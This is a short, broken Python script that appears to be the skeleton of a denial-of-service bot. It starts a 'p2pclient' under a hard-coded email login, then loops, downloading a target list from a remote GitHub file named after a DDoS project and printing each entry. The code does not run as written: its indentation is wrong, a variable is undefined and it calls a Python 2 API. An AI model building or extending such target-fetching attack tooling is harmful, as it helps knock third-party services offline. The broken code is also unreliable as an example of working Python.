#!/usr/bin/env python3

import socket,time,threading,sys,random,os,subprocess,requests,urllib
from os import getcwd

with open('test.txt', 'w') as f:
    process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
    stdout=f,
    stderr=f)
os.remove("test.txt")
   
while 1 == 1:
    timeout=time.time()+3600
 #   url = "https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt"
 #   directory = getcwd()
 #   filename = directory + 'target.txt'
 #   r = requests.get(url)
 #   f = open(filename,'w')
 #   f.write(str(r.content)+'\n')
 #   f.close
testfile = urllib.URLopener()
testfile.retrieve("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
    with open(filename,'r') as f:
        for row in f:
            rrow = row.split()
            print (rrow)